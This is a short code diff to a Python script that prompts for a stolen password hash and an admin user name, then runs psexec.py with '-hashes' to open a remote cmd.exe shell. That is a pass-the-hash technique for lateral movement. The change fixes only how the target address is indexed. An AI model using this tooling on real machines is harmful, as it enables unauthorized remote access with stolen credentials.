@@ -8,7 +8,7 @@ def connectToMachine():
     hashToEnter = input("Enter the hash received: ")
     userName = input("Enter the name of the user with admin rights: ")
     dir = os.getcwd()
-    cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address + " cmd.exe"
+    cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address[0] + " cmd.exe"
     subprocess.Popen(cmnd, cwd=dir, shell=True)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
